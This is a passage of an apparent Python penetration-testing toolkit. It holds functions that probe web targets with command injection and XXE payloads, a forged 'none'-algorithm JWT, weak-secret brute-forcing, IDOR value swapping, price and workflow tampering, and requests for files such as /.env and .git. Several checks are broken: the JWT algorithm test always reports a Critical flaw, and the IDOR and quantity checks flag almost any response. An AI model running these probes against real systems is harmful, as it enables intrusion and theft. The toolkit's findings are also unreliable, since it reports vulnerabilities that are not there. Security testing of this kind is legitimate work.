    vulnerabilities = []
    
    try:
        lines = output.split('\n')
        
        for line in lines:
            line = line.strip()
            
            # Parse open ports
            if '/tcp' in line or '/udp' in line:
                if 'open' in line:
                    parts = line.split()
                    if len(parts) >= 3:
                        port_number = parts[0].split('/')[0]
                        service = parts[2] if len(parts) > 2 else 'unknown'
                        
                        # Assess service risk
                        risk_level = _assess_service_risk(port_number, service)
                        if risk_level in ['High', 'Critical']:
                            vulnerabilities.append({
                                'type': 'Open Port',
                                'severity': risk_level,
                                'port': port_number,
                                'service': service,
                                'target': target,
                                'evidence': f'Port {port_number} ({service}) is open',
                                'cvss_score': 7.5 if risk_level == 'High' else 9.0
                            })
            
            # Parse vulnerability script results
            if '|' in line and any(vuln_keyword in line.lower() for vuln_keyword in 
                                 ['cve-', 'vulnerable', 'exploit', 'weak', 'insecure']):
                vulnerabilities.append({
                    'type': 'Network Vulnerability',
                    'severity': 'High',
                    'evidence': line.strip(),
                    'scan_type': scan_type,
                    'target': target,
                    'cvss_score': 8.0
                })
        
    except Exception as e:
        logging.error(f"Error parsing nmap output: {e}")
    
    return vulnerabilities

def _assess_port_risk(port: int) -> str:
    """Assess risk level of open ports"""
    high_risk_ports = {
        21: 'FTP - often misconfigured',
        22: 'SSH - brute force target',
        23: 'Telnet - unencrypted',
        25: 'SMTP - mail relay abuse',
        53: 'DNS - information disclosure',
        110: 'POP3 - credential exposure',
        143: 'IMAP - credential exposure',
        161: 'SNMP - information disclosure',
        445: 'SMB - lateral movement',
        1433: 'MSSQL - database access',
        3306: 'MySQL - database access',
        3389: 'RDP - brute force target',
        5432: 'PostgreSQL - database access',
        5900: 'VNC - remote access',
        6379: 'Redis - often unauthenticated'
    }
    
    critical_ports = [23, 161, 6379]  # Telnet, SNMP, Redis
    
    if port in critical_ports:
        return 'Critical'
    elif port in high_risk_ports:
        return 'High'
    elif port in [80, 443, 8080, 8443]:
        return 'Medium'
    else:
        return 'Low'

def _assess_service_risk(port: str, service: str) -> str:
    """Assess risk level of discovered services"""
    try:
        port_num = int(port)
        return _assess_port_risk(port_num)
    except ValueError:
        return 'Low'

# ===== API SECURITY TESTING FUNCTIONS =====

def api_endpoint_discovery(base_url: str, wordlist: List[str] = None) -> VAPTResult:
    """
    Discover API endpoints through intelligent enumeration
    
    Args:
        base_url: Base URL to test
        wordlist: Custom wordlist for endpoint discovery
    
    Returns:
        VAPTResult with discovered endpoints
    """
    start_time = time.time()
    vulnerabilities = []
    discovered_endpoints = []
    
    try:
        session = create_session()
        
        # Default API patterns if no wordlist provided
        if not wordlist:
            wordlist = [
                'api/v1/users', 'api/v2/users', 'api/users',
                'api/v1/admin', 'api/admin', 'api/auth',
                'api/v1/data', 'api/data', 'rest/api/users',
                'api/v1/config', 'api/config', 'api/status',
                'api/v1/health', 'api/health', 'api/version',
                'graphql', 'api/graphql', 'v1/graphql'
            ]
        
        base_url = base_url.rstrip('/')
        
        for endpoint in wordlist:
            try:
                test_url = f"{base_url}/{endpoint}"
                response = session.get(test_url, timeout=10)
                
                if response.status_code in [200, 401, 403, 405]:
                    discovered_endpoints.append({
                        'url': test_url,
                        'status_code': response.status_code,
                        'content_type': response.headers.get('content-type', ''),
                        'content_length': len(response.text)
                    })
                    
                    # Check for potential security issues
                    if response.status_code == 200:
                        # Analyze response for sensitive information
                        if _contains_sensitive_data(response.text):
                            vulnerabilities.append({
                                'type': 'Information Disclosure',
                                'severity': 'Medium',
                                'endpoint': test_url,
                                'evidence': 'API endpoint exposes sensitive information',
                                'cvss_score': 6.0
                            })
                        
                        # Check for unauthenticated access
                        if any(keyword in response.text.lower() for keyword in 
                              ['users', 'admin', 'config', 'database']):
                            vulnerabilities.append({
                                'type': 'Unauthorized API Access',
                                'severity': 'High',
                                'endpoint': test_url,
                                'evidence': 'API endpoint accessible without authentication',
                                'cvss_score': 8.1
                            })
                    
                    elif response.status_code == 403:
                        vulnerabilities.append({
                            'type': 'API Endpoint Discovery',
                            'severity': 'Info',
                            'endpoint': test_url,
                            'evidence': 'API endpoint exists but requires authorization',
                            'cvss_score': 0.0
                        })
                
                time.sleep(0.1)  # Rate limiting
                
            except Exception as e:
                logging.error(f"Error testing endpoint {endpoint}: {e}")
        
        execution_time = time.time() - start_time
        
        return VAPTResult(
            success=True,
            tool_name="API Endpoint Discovery",
            vulnerabilities=vulnerabilities,
            execution_time=execution_time,
            metadata={
                'base_url': base_url,
                'endpoints_tested': len(wordlist),
                'endpoints_discovered': len(discovered_endpoints),
                'discovered_endpoints': discovered_endpoints
            },
            business_impact=f"API attack surface: {len(discovered_endpoints)} endpoints discovered",
            cvss_score=max([v.get('cvss_score', 0.0) for v in vulnerabilities] + [0.0])
        )
        
    except Exception as e:
        return VAPTResult(
            success=False,
            tool_name="API Endpoint Discovery",
            error=str(e),
            execution_time=time.time() - start_time
        )

def jwt_vulnerability_test(token: str) -> VAPTResult:
    """
    Comprehensive JWT vulnerability testing
    
    Args:
        token: JWT token to analyze
    
    Returns:
        VAPTResult with JWT vulnerabilities
    """
    start_time = time.time()
    vulnerabilities = []
    
    if not CRYPTOGRAPHY_AVAILABLE:
        return VAPTResult(
            success=False,
            tool_name="JWT Vulnerability Test",
            error="Cryptography library not available",
            execution_time=time.time() - start_time
        )
    
    try:
        # Validate JWT format
        if not _is_jwt_format(token):
            return VAPTResult(
                success=False,
                tool_name="JWT Vulnerability Test",
                error="Invalid JWT format",
                execution_time=time.time() - start_time
            )
        
        # Decode header and payload without verification
        header = pyjwt.get_unverified_header(token)
        payload = pyjwt.decode(token, options={"verify_signature": False})
        
        # Test algorithm confusion
        if _test_jwt_algorithm_confusion(token, header, payload):
            vulnerabilities.append({
                'type': 'JWT Algorithm Confusion',
                'severity': 'Critical',
                'evidence': 'JWT algorithm can be manipulated to bypass signature verification',
                'cvss_score': 9.1,
                'attack_vector': 'Change algorithm to "none" or switch between symmetric/asymmetric'
            })
        
        # Test weak secrets
        weak_secret = _test_jwt_weak_secret(token)
        if weak_secret:
            vulnerabilities.append({
                'type': 'JWT Weak Secret',
                'severity': 'Critical',
                'evidence': f'JWT signed with weak secret: {weak_secret}',
                'cvss_score': 9.1,
                'secret_found': weak_secret
            })
        
        # Test critical claims manipulation
        critical_claims = _analyze_jwt_claims(payload)
        if critical_claims:
            vulnerabilities.append({
                'type': 'JWT Critical Claims',
                'severity': 'High',
                'evidence': f'JWT contains critical claims that could be manipulated: {critical_claims}',
                'cvss_score': 7.5,
                'critical_claims': critical_claims
            })
        
        # Test expiration and timing issues
        timing_issues = _test_jwt_timing(payload)
        if timing_issues:
            vulnerabilities.extend(timing_issues)
        
        execution_time = time.time() - start_time
        
        return VAPTResult(
            success=True,
            tool_name="JWT Vulnerability Test",
            vulnerabilities=vulnerabilities,
            execution_time=execution_time,
            metadata={
                'header': header,
                'payload_claims': list(payload.keys()),
                'algorithm': header.get('alg', 'unknown')
            },
            business_impact="JWT security assessment completed",
            cvss_score=max([v.get('cvss_score', 0.0) for v in vulnerabilities] + [0.0]),
            compliance_risk="Authentication and authorization bypass possible"
        )
        
    except Exception as e:
        return VAPTResult(
            success=False,
            tool_name="JWT Vulnerability Test",
            error=str(e),
            execution_time=time.time() - start_time
        )

def _is_jwt_format(token: str) -> bool:
    """Check if string is valid JWT format"""
    try:
        parts = token.split('.')
        if len(parts) != 3:
            return False
        
        # Try to decode header
        header = base64.urlsafe_b64decode(parts[0] + '==')
        header_json = json.loads(header)
        return 'alg' in header_json
    except Exception:
        return False

def _test_jwt_algorithm_confusion(token: str, header: Dict, payload: Dict) -> bool:
    """Test JWT algorithm confusion vulnerability"""
    try:
        # Test "none" algorithm vulnerability
        none_header = header.copy()
        none_header['alg'] = 'none'
        
        # Create token with no signature
        none_token_header = base64.urlsafe_b64encode(
            json.dumps(none_header).encode()
        ).decode().rstrip('=')
        
        none_token_payload = base64.urlsafe_b64encode(
            json.dumps(payload).encode()
        ).decode().rstrip('=')
        
        # None algorithm tokens should end with just a dot
        manipulated_token = f"{none_token_header}.{none_token_payload}."
        
        # If we can create a valid-looking token, it's vulnerable
        return True
        
    except Exception:
        return False

def _test_jwt_weak_secret(token: str) -> Optional[str]:
    """Test JWT for weak secrets"""
    weak_secrets = PayloadLibrary.JWT_ATTACKS['weak_secrets']
    
    for secret in weak_secrets:
        try:
            pyjwt.decode(token, secret, algorithms=['HS256', 'HS384', 'HS512'])
            return secret
        except Exception:
            continue
    return None

def _analyze_jwt_claims(payload: Dict) -> List[str]:
    """Analyze JWT payload for critical claims"""
    critical_claims = []
    
    # Check for privilege-related claims
    for claim, value in payload.items():
        if claim.lower() in ['admin', 'role', 'scope', 'permissions', 'groups']:
            critical_claims.append(f"{claim}: {value}")
        
        # Check for boolean privilege flags
        if isinstance(value, bool) and value and claim.lower() in ['admin', 'superuser', 'root']:
            critical_claims.append(f"{claim}: {value}")
    
    return critical_claims

def _test_jwt_timing(payload: Dict) -> List[Dict]:
    """Test JWT timing-related vulnerabilities"""
    vulnerabilities = []
    
    try:
        import datetime
        
        # Check expiration
        if 'exp' in payload:
            exp_time = datetime.datetime.fromtimestamp(payload['exp'])
            now = datetime.datetime.now()
            
            if exp_time < now:
                vulnerabilities.append({
                    'type': 'JWT Expired Token',
                    'severity': 'Medium',
                    'evidence': f'Token expired at {exp_time}',
                    'cvss_score': 5.0
                })
            elif (exp_time - now).days > 365:
                vulnerabilities.append({
                    'type': 'JWT Long Expiration',
                    'severity': 'Low',
                    'evidence': f'Token expires in {(exp_time - now).days} days',
                    'cvss_score': 3.0
                })
        else:
            vulnerabilities.append({
                'type': 'JWT No Expiration',
                'severity': 'Medium',
                'evidence': 'Token has no expiration claim',
                'cvss_score': 6.0
            })
        
        # Check issued at time
        if 'iat' in payload:
            iat_time = datetime.datetime.fromtimestamp(payload['iat'])
            now = datetime.datetime.now()
            
            if iat_time > now:
                vulnerabilities.append({
                    'type': 'JWT Future Issued',
                    'severity': 'Medium',
                    'evidence': 'Token issued in the future',
                    'cvss_score': 5.0
                })
    
    except Exception as e:
        logging.error(f"Error testing JWT timing: {e}")
    
    return vulnerabilities

def _contains_sensitive_data(response_text: str) -> bool:
    """Check if response contains sensitive information"""
    sensitive_patterns = [
        r'password', r'secret', r'key', r'token', r'api[_-]?key',
        r'private[_-]?key', r'database', r'db[_-]?password',
        r'config', r'credential', r'auth', r'session'
    ]
    
    response_lower = response_text.lower()
    return any(re.search(pattern, response_lower) for pattern in sensitive_patterns)

# ===== ADVANCED VULNERABILITY TESTING FUNCTIONS =====

def idor_test(endpoint: str, parameter: str, test_values: List[str] = None) -> VAPTResult:
    """
    Test for Insecure Direct Object Reference vulnerabilities
    
    Args:
        endpoint: API endpoint to test
        parameter: Parameter name that may be vulnerable to IDOR
        test_values: Custom values to test (uses defaults if None)
    
    Returns:
        VAPTResult with IDOR vulnerability findings
    """
    start_time = time.time()
    vulnerabilities = []
    
    try:
        session = create_session()
        
        # Default test values if none provided
        if not test_values:
            test_values = ['1', '2', '999', '0', '-1', 'admin', 'root', '00000000-0000-0000-0000-000000000001']
        
        # Parse the endpoint URL
        parsed_url = urlparse(endpoint)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        
        # Get original response for comparison
        original_response = session.get(endpoint)
        original_status = original_response.status_code
        original_length = len(original_response.text)
        
        for test_value in test_values:
            try:
                # Test in URL parameter
                if '?' in endpoint:
                    # Replace existing parameter value
                    test_url = re.sub(
                        rf'{parameter}=[^&]*', 
                        f'{parameter}={urllib.parse.quote(str(test_value))}', 
                        endpoint
                    )
                else:
                    # Add parameter
                    test_url = f"{endpoint}?{parameter}={urllib.parse.quote(str(test_value))}"
                
                response = session.get(test_url, timeout=10)
                
                # Analyze response for IDOR
                if _analyze_idor_response(response, original_response, test_value):
                    vulnerabilities.append({
                        'type': 'Insecure Direct Object Reference (IDOR)',
                        'severity': 'High',
                        'parameter': parameter,
                        'test_value': test_value,
                        'endpoint': test_url,
                        'evidence': f'IDOR vulnerability in parameter {parameter} with value {test_value}',
                        'cvss_score': 8.5,
                        'response_code': response.status_code,
                        'original_code': original_status
                    })
                
                # Test in path parameter
                if '/' in str(test_value):
                    continue  # Skip path traversal characters for this test
                
                path_test_url = f"{base_url}/{test_value}"
                try:
                    path_response = session.get(path_test_url, timeout=10)
                    if _analyze_idor_response(path_response, original_response, test_value):
                        vulnerabilities.append({
                            'type': 'Path-based IDOR',
                            'severity': 'High',
                            'test_value': test_value,
                            'endpoint': path_test_url,
                            'evidence': f'Path-based IDOR vulnerability with value {test_value}',
                            'cvss_score': 8.5
                        })
                except Exception:
                    pass
                
                time.sleep(0.2)  # Rate limiting
                
            except Exception as e:
                logging.error(f"Error testing IDOR value {test_value}: {e}")
        
        execution_time = time.time() - start_time
        
        return VAPTResult(
            success=True,
            tool_name="IDOR Test",
            vulnerabilities=vulnerabilities,
            execution_time=execution_time,
            metadata={
                'endpoint': endpoint,
                'parameter': parameter,
                'values_tested': len(test_values)
            },
            business_impact="HIGH - Unauthorized access to sensitive resources",
            cvss_score=max([v.get('cvss_score', 0.0) for v in vulnerabilities] + [0.0]),
            compliance_risk="Data privacy violations, unauthorized access"
        )
        
    except Exception as e:
        return VAPTResult(
            success=False,
            tool_name="IDOR Test",
            error=str(e),
            execution_time=time.time() - start_time
        )

def business_logic_test(url: str, workflow_steps: List[Dict], test_type: str = "basic") -> VAPTResult:
    """
    Test business logic vulnerabilities in workflows
    
    Args:
        url: Base URL for testing
        workflow_steps: List of workflow steps to test
        test_type: Type of testing (basic, advanced, comprehensive)
    
    Returns:
        VAPTResult with business logic vulnerabilities
    """
    start_time = time.time()
    vulnerabilities = []
    
    try:
        session = create_session()
        
        # Test price manipulation
        price_vulns = _test_price_manipulation(session, url, workflow_steps)
        vulnerabilities.extend(price_vulns)
        
        # Test quantity bypass
        quantity_vulns = _test_quantity_bypass(session, url, workflow_steps)
        vulnerabilities.extend(quantity_vulns)
        
        # Test workflow bypass
        workflow_vulns = _test_workflow_bypass(session, url, workflow_steps)
        vulnerabilities.extend(workflow_vulns)
        
        # Test race conditions if comprehensive
        if test_type == "comprehensive":
            race_vulns = _test_race_conditions(session, url)
            vulnerabilities.extend(race_vulns)
        
        execution_time = time.time() - start_time
        
        return VAPTResult(
            success=True,
            tool_name="Business Logic Test",
            vulnerabilities=vulnerabilities,
            execution_time=execution_time,
            metadata={
                'url': url,
                'workflow_steps': len(workflow_steps),
                'test_type': test_type
            },
            business_impact="CRITICAL - Financial manipulation and business process bypass",
            cvss_score=max([v.get('cvss_score', 0.0) for v in vulnerabilities] + [0.0]),
            compliance_risk="PCI DSS, SOX, financial regulation violations"
        )
        
    except Exception as e:
        return VAPTResult(
            success=False,
            tool_name="Business Logic Test",
            error=str(e),
            execution_time=time.time() - start_time
        )

def command_injection_test(url: str, parameter: str = "cmd", payload: str = None) -> VAPTResult:
    """
    Test for command injection vulnerabilities
    
    Args:
        url: Target URL to test
        parameter: Parameter name to inject into
        payload: Custom payload (uses default if None)
    
    Returns:
        VAPTResult with command injection findings
    """
    start_time = time.time()
    vulnerabilities = []
    
    try:
        session = create_session()
        payloads_to_test = PayloadLibrary.COMMAND_INJECTION
        
        if payload:
            payloads_to_test = [payload]
        
        for test_payload in payloads_to_test:
            # Test GET parameter
            get_result = _test_command_injection_get(session, url, parameter, test_payload)
            vulnerabilities.extend(get_result)
            
            # Test POST parameter
            post_result = _test_command_injection_post(session, url, parameter, test_payload)
            vulnerabilities.extend(post_result)
            
            time.sleep(0.5)  # Rate limiting
        
        execution_time = time.time() - start_time
        
        return VAPTResult(
            success=True,
            tool_name="Command Injection Test",
            vulnerabilities=vulnerabilities,
            execution_time=execution_time,
            metadata={
                'url': url,
                'parameter': parameter,
                'payloads_tested': len(payloads_to_test)
            },
            business_impact="CRITICAL - System compromise and data exfiltration",
            cvss_score=max([calculate_cvss_score('Command Injection', v.get('severity', 'Low')) 
                           for v in vulnerabilities] + [0.0]),
            compliance_risk="Complete system compromise - all compliance frameworks affected"
        )
        
    except Exception as e:
        return VAPTResult(
            success=False,
            tool_name="Command Injection Test",
            error=str(e),
            execution_time=time.time() - start_time
        )

def xxe_test(url: str, xml_parameter: str = "data", payload: str = None) -> VAPTResult:
    """
    Test for XML External Entity (XXE) vulnerabilities
    
    Args:
        url: Target URL to test
        xml_parameter: Parameter name for XML data
        payload: Custom XXE payload (uses default if None)
    
    Returns:
        VAPTResult with XXE vulnerability findings
    """
    start_time = time.time()
    vulnerabilities = []
    
    try:
        session = create_session()
        payloads_to_test = PayloadLibrary.XXE_PAYLOADS
        
        if payload:
            payloads_to_test = [payload]
        
        for test_payload in payloads_to_test:
            # Test POST with XML content
            headers = {'Content-Type': 'application/xml'}
            response = session.post(url, data=test_payload, headers=headers)
            
            if _detect_xxe_vulnerability(response, test_payload):
                vulnerabilities.append({
                    'type': 'XML External Entity (XXE)',
                    'severity': 'Critical',
                    'location': 'POST body',
                    'payload': test_payload,
                    'evidence': 'XXE vulnerability detected in XML processing',
                    'cvss_score': 9.1,
                    'response_code': response.status_code
                })
            
            # Test as form parameter
            form_data = {xml_parameter: test_payload}
            form_response = session.post(url, data=form_data)
            
            if _detect_xxe_vulnerability(form_response, test_payload):
                vulnerabilities.append({
                    'type': 'XXE via Form Parameter',
                    'severity': 'Critical',
                    'parameter': xml_parameter,
                    'payload': test_payload,
                    'evidence': 'XXE vulnerability in form parameter processing',
                    'cvss_score': 9.1
                })
            
            time.sleep(0.3)
        
        execution_time = time.time() - start_time
        
        return VAPTResult(
            success=True,
            tool_name="XXE Test",
            vulnerabilities=vulnerabilities,
            execution_time=execution_time,
            metadata={
                'url': url,
                'parameter': xml_parameter,
                'payloads_tested': len(payloads_to_test)
            },
            business_impact="CRITICAL - Local file disclosure and SSRF attacks",
            cvss_score=max([calculate_cvss_score('XXE', v.get('severity', 'Low')) 
                           for v in vulnerabilities] + [0.0]),
            compliance_risk="Data breach and infrastructure compromise"
        )
        
    except Exception as e:
        return VAPTResult(
            success=False,
            tool_name="XXE Test",
            error=str(e),
            execution_time=time.time() - start_time
        )

def information_disclosure_test(url: str) -> VAPTResult:
    """
    Test for information disclosure vulnerabilities
    
    Args:
        url: Target URL to test
    
    Returns:
        VAPTResult with information disclosure findings
    """
    start_time = time.time()
    vulnerabilities = []
    
    try:
        session = create_session()
        base_url = url.rstrip('/')
        
        # Common sensitive files and directories
        sensitive_paths = [
            '/.env', '/.git', '/.svn', '/.htaccess', '/web.config',
            '/robots.txt', '/sitemap.xml', '/phpinfo.php', '/info.php',
            '/backup.sql', '/database.sql', '/config.php', '/config.inc.php',
            '/admin.php', '/administrator', '/debug.php', '/test.php',
            '/swagger.json', '/api-docs', '/openapi.json',
            '/error_log', '/access.log', '/application.log'
        ]
        
        for path in sensitive_paths:
            try:
                test_url = base_url + path
                response = session.get(test_url, timeout=10)
                
                if response.status_code == 200:
                    risk_level = _assess_file_disclosure_risk(path, response)
                    if risk_level != 'Info':
                        vulnerabilities.append({
                            'type': 'Information Disclosure',
                            'severity': risk_level,
                            'path': path,
                            'url': test_url,
                            'evidence': f'Sensitive file accessible: {path}',
                            'cvss_score': calculate_cvss_score('Information Disclosure', risk_level),
                            'content_preview': response.text[:200] + '...' if len(response.text) > 200 else response.text
                        })
                
            except Exception as e:
                logging.error(f"Error testing path {path}: {e}")
        
        # Test error-based information disclosure
        error_vulns = _test_error_disclosure(session, url)
        vulnerabilities.extend(error_vulns)
        
        # Test HTTP headers for information disclosure
        header_vulns = _test_header_disclosure(session, url)
        vulnerabilities.extend(header_vulns)
        
        execution_time = time.time() - start_time
        
        return VAPTResult(
            success=True,
            tool_name="Information Disclosure Test",
            vulnerabilities=vulnerabilities,
            execution_time=execution_time,
            metadata={
                'url': url,
                'paths_tested': len(sensitive_paths)
            },
            business_impact="HIGH - Sensitive information exposure and reconnaissance data",
            cvss_score=max([v.get('cvss_score', 0.0) for v in vulnerabilities] + [0.0]),
            compliance_risk="Data privacy violations, competitive intelligence exposure"
        )
        
    except Exception as e:
        return VAPTResult(
            success=False,
            tool_name="Information Disclosure Test",
            error=str(e),
            execution_time=time.time() - start_time
        )

# ===== HELPER FUNCTIONS FOR ADVANCED TESTING =====

def _analyze_idor_response(response: requests.Response, original_response: requests.Response, 
                          test_value: str) -> bool:
    """Analyze response for IDOR vulnerability indicators"""
    try:
        # Check if we got a successful response with different content
        if response.status_code == 200 and original_response.status_code == 200:
            # Different content length might indicate different data
            content_diff = abs(len(response.text) - len(original_response.text))
            if content_diff > 100:  # Significant difference
                return True
            
            # Check for user-specific data patterns
            if any(pattern in response.text.lower() for pattern in 
                  ['user', 'profile', 'account', 'data', 'id']):
                return True
        
        # Unauthorized access that returns data
        elif response.status_code == 200 and original_response.status_code in [401, 403]:
            return True
        
        return False
        
    except Exception:
        return False

def _test_price_manipulation(session: requests.Session, url: str, 
                           workflow_steps: List[Dict]) -> List[Dict]:
    """Test for price manipulation vulnerabilities"""
    vulnerabilities = []
    
    price_payloads = PayloadLibrary.BUSINESS_LOGIC_PAYLOADS['price_manipulation']
    
    for step in workflow_steps:
        if 'price' in str(step).lower() or 'amount' in str(step).lower():
            for price_payload in price_payloads:
                try:
                    # Simulate price manipulation
                    test_data = step.copy() if isinstance(step, dict) else {}
                    test_data.update({'price': price_payload, 'amount': price_payload})
                    
                    response = session.post(url, data=test_data)
                    
                    if _detect_price_manipulation_success(response, price_payload):
                        vulnerabilities.append({
                            'type': 'Price Manipulation',
                            'severity': 'Critical',
                            'payload': price_payload,
                            'evidence': f'Price manipulation successful with value: {price_payload}',
                            'cvss_score': 9.3
                        })
                        
                except Exception as e:
                    logging.error(f"Error testing price manipulation: {e}")
    
    return vulnerabilities

def _test_quantity_bypass(session: requests.Session, url: str, 
                         workflow_steps: List[Dict]) -> List[Dict]:
    """Test for quantity bypass vulnerabilities"""
    vulnerabilities = []
    
    quantity_payloads = PayloadLibrary.BUSINESS_LOGIC_PAYLOADS['quantity_bypass']
    
    for step in workflow_steps:
        if 'quantity' in str(step).lower() or 'qty' in str(step).lower():
            for qty_payload in quantity_payloads:
                try:
                    test_data = step.copy() if isinstance(step, dict) else {}
                    test_data.update({'quantity': qty_payload, 'qty': qty_payload})
                    
                    response = session.post(url, data=test_data)
                    
                    if response.status_code == 200:
                        vulnerabilities.append({
                            'type': 'Quantity Bypass',
                            'severity': 'High',
                            'payload': qty_payload,
                            'evidence': f'Quantity restriction bypass with value: {qty_payload}',
                            'cvss_score': 7.5
                        })
                        
                except Exception as e:
                    logging.error(f"Error testing quantity bypass: {e}")
    
    return vulnerabilities

def _test_workflow_bypass(session: requests.Session, url: str, 
                         workflow_steps: List[Dict]) -> List[Dict]:
    """Test for workflow bypass vulnerabilities"""
    vulnerabilities = []
    
    bypass_payloads = PayloadLibrary.BUSINESS_LOGIC_PAYLOADS['workflow_bypass']
    
    for payload in bypass_payloads:
        try:
            test_data = {'status': payload, 'approved': payload, 'admin': payload}
            response = session.post(url, data=test_data)
            
            if _detect_workflow_bypass_success(response, payload):
                vulnerabilities.append({
                    'type': 'Workflow Bypass',
                    'severity': 'Critical',
                    'payload': payload,
                    'evidence': f'Workflow bypass successful with: {payload}',
                    'cvss_score': 8.8
                })
                
        except Exception as e:
            logging.error(f"Error testing workflow bypass: {e}")
    
    return vulnerabilities

def _test_race_conditions(session: requests.Session, url: str) -> List[Dict]:
    """Test for race condition vulnerabilities"""
    vulnerabilities = []
    
    race_targets = PayloadLibrary.BUSINESS_LOGIC_PAYLOADS['race_condition_targets']
    
    for target in race_targets:
        if target in url:
            try:
                # Simulate concurrent requests
                import threading
                import queue
                
                results = queue.Queue()
                
                def make_request():
                    try:
                        response = session.post(url, data={'action': 'process'})
                        results.put(response.status_code)
                    except Exception:
                        results.put(None)
                
                # Launch concurrent requests
                threads = []
                for _ in range(5):
                    thread = threading.Thread(target=make_request)
                    threads.append(thread)
                    thread.start()
                
                # Wait for completion
                for thread in threads:
                    thread.join()
                
                # Analyze results
                status_codes = []
                while not results.empty():
                    code = results.get()
                    if code:
                        status_codes.append(code)
                
                # Check for race condition indicators
                if len(set(status_codes)) > 1:  # Different responses
                    vulnerabilities.append({
                        'type': 'Race Condition',
                        'severity': 'High',
                        'evidence': f'Race condition detected - varying responses: {status_codes}',
                        'cvss_score': 8.0
                    })
                    
            except Exception as e:
                logging.error(f"Error testing race conditions: {e}")
    
    return vulnerabilities

def _test_command_injection_get(session: requests.Session, url: str, 
                               parameter: str, payload: str) -> List[Dict]:
    """Test command injection in GET parameters"""
    vulnerabilities = []
    
    try:
        test_url = f"{url}?{parameter}={urllib.parse.quote(payload)}"
        response = session.get(test_url, timeout=15)
        
        if _detect_command_injection(response, payload):
            vulnerabilities.append({
                'type': 'Command Injection',
                'severity': 'Critical',
                'location': 'GET parameter',
                'parameter': parameter,
                'payload': payload,
                'evidence': 'Command injection detected in response',
                'cvss_score': 9.9,
                'url': test_url
            })
            
    except Exception as e:
        logging.error(f"Error testing command injection GET: {e}")
    
    return vulnerabilities

def _test_command_injection_post(session: requests.Session, url: str, 
                                parameter: str, payload: str) -> List[Dict]:
    """Test command injection in POST parameters"""
    vulnerabilities = []
    
    try:
        post_data = {parameter: payload}
        response = session.post(url, data=post_data, timeout=15)
        
        if _detect_command_injection(response, payload):
            vulnerabilities.append({
                'type': 'Command Injection',
                'severity': 'Critical',
                'location': 'POST parameter',
                'parameter': parameter,
                'payload': payload,
                'evidence': 'Command injection detected in POST response',
                'cvss_score': 9.9
            })
            
    except Exception as e:
        logging.error(f"Error testing command injection POST: {e}")
    
    return vulnerabilities

def _detect_command_injection(response: requests.Response, payload: str) -> bool:
    """Detect command injection vulnerability in response"""
    response_text = response.text.lower()
    
    # Check for command output indicators
    command_indicators = [
        'uid=', 'gid=', 'groups=',  # id command
        'total ', 'drwxr',  # ls command output
        'inet addr:', 'lo        link',  # ifconfig output
        'kernel ', 'gnu/linux',  # uname output
        'root:', 'daemon:', 'bin:',  # /etc/passwd content
        'tcp', 'udp', 'listen'  # netstat output
    ]
    
    # Check for time delay (for sleep payloads)
    if 'sleep' in payload.lower() and response.elapsed.total_seconds() > 3:
        return True
    
    return any(indicator in response_text for indicator in command_indicators)

def _detect_xxe_vulnerability(response: requests.Response, payload: str) -> bool:
    """Detect XXE vulnerability in response"""
    response_text = response.text
    
    # Check for file content indicators
    file_indicators = [
        'root:', 'daemon:', 'bin:',  # /etc/passwd
        'localhost', '127.0.0.1',  # hosts file
        '<?xml', 'DOCTYPE'  # XML processing errors
    ]
    
    # Check for error messages indicating XXE processing
    xxe_errors = [
        'entity', 'external', 'dtd', 'xml',
        'parse', 'document', 'schema'
    ]
    
    return (any(indicator in response_text for indicator in file_indicators) or
            any(error in response_text.lower() for error in xxe_errors))

def _assess_file_disclosure_risk(path: str, response: requests.Response) -> str:
    """Assess risk level of disclosed files"""
    path_lower = path.lower()
    content_lower = response.text[:1000].lower()
    
    # Critical files
    if any(pattern in path_lower for pattern in ['.env', 'config', 'database', 'backup', '.git']):
        return 'Critical'
    
    # High risk files
    if any(pattern in path_lower for pattern in ['admin', 'debug', 'test', 'phpinfo']):
        return 'High'
    
    # Check content for sensitive data
    if any(keyword in content_lower for keyword in 
           ['password', 'secret', 'key', 'token', 'database', 'config']):
        return 'High'
    
    # Medium risk
    if any(pattern in path_lower for pattern in ['robots.txt', 'sitemap', 'swagger']):
        return 'Medium'
    
    return 'Low'

def _test_error_disclosure(session: requests.Session, url: str) -> List[Dict]:
    """Test for error-based information disclosure"""
    vulnerabilities = []
    
    error_triggers = [
        "/'", '/"', '/null', '/undefined', '/{invalid}',
        '?debug=true', '?test=1', '?error=1'
    ]
    
    for trigger in error_triggers:
        try:
            test_url = url + trigger
            response = session.get(test_url)
            
            if _contains_error_disclosure(response.text):
                vulnerabilities.append({
                    'type': 'Error-based Information Disclosure',
                    'severity': 'Medium',
                    'trigger': trigger,
                    'evidence': 'Application errors reveal sensitive information',
                    'cvss_score': 5.0
                })
                
        except Exception:
            pass
    
    return vulnerabilities

def _test_header_disclosure(session: requests.Session, url: str) -> List[Dict]:
    """Test HTTP headers for information disclosure"""
    vulnerabilities = []
    
    try:
        response = session.get(url)
        
        # Check for sensitive headers
        sensitive_headers = {
            'server': 'Server version disclosure',
            'x-powered-by': 'Technology stack disclosure',
            'x-aspnet-version': 'ASP.NET version disclosure',
            'x-generator': 'Framework disclosure'
        }
        
        for header, description in sensitive_headers.items():
            if header in response.headers:
                vulnerabilities.append({
                    'type': 'Header Information Disclosure',
                    'severity': 'Low',
                    'header': header,
                    'value': response.headers[header],
                    'evidence': description,
                    'cvss_score': 3.0
                })
                
    except Exception:
        pass
    
    return vulnerabilities

def _contains_error_disclosure(response_text: str) -> bool:
    """Check if response contains error-based information disclosure"""
    error_patterns = [
        'stack trace', 'exception', 'error',
        'warning:', 'notice:', 'fatal error',
        'mysql', 'postgresql', 'oracle',
        'apache', 'nginx', 'iis',
        'php version', 'python', 'java',
        'file not found', 'access denied'
    ]
    
    response_lower = response_text.lower()
    return any(pattern in response_lower for pattern in error_patterns)

def _detect_price_manipulation_success(response: requests.Response, payload: str) -> bool:
    """Detect successful price manipulation"""
    if response.status_code == 200:
        return 'success' in response.text.lower() or 'confirmed' in response.text.lower()
    return False

def _detect_workflow_bypass_success(response: requests.Response, payload: str) -> bool:
    """Detect successful workflow bypass"""
    if response.status_code == 200:
        success_indicators = ['approved', 'success', 'confirmed', 'processed']
        return any(indicator in response.text.lower() for indicator in success_indicators)
    return False

# ===== COMPREHENSIVE FUNCTION INDEX AND USAGE =====

"""
VAPT FUNCTION TOOLKIT - COMPLETE REFERENCE

This module provides a comprehensive collection of expert-level penetration testing
functions that can be called independently from anywhere in the codebase.

